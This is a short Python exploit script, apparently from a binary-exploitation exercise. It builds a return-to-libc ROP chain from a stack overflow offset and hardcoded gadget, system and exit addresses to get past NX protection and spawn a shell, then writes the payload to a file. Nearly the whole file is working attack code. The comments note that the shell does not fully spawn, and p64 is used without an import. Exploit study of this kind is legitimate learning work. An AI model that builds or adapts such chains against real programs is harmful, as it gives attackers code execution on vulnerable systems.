# Generates `payload` to exploit NX defense.

# Using pattc, patto to find the offset.
# https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow
numOfPads = 1352

# 0x7fffffffdab0 in the middle of the NOPs.
bin_sh = 0x7ffff7f785bd
ret = 0x40115e
pop_rdi = 0x401253
system = 0x7ffff7e16290
exit = 0x7ffff7e0aa40
id = 0x7ffff7dd5ed6

# Similarly, it does run the shell but doesn't spawn it...
payload = b"\x90" * (numOfPads)
payload += p64(ret) # To make it 16 byte aligned.
payload += p64(pop_rdi)
payload += p64(id)
payload += p64(system)
payload += p64(exit)

# Replace if needed
payloadPath = "./payload"

with open (payloadPath, 'wb') as f:
    f.write(payload)
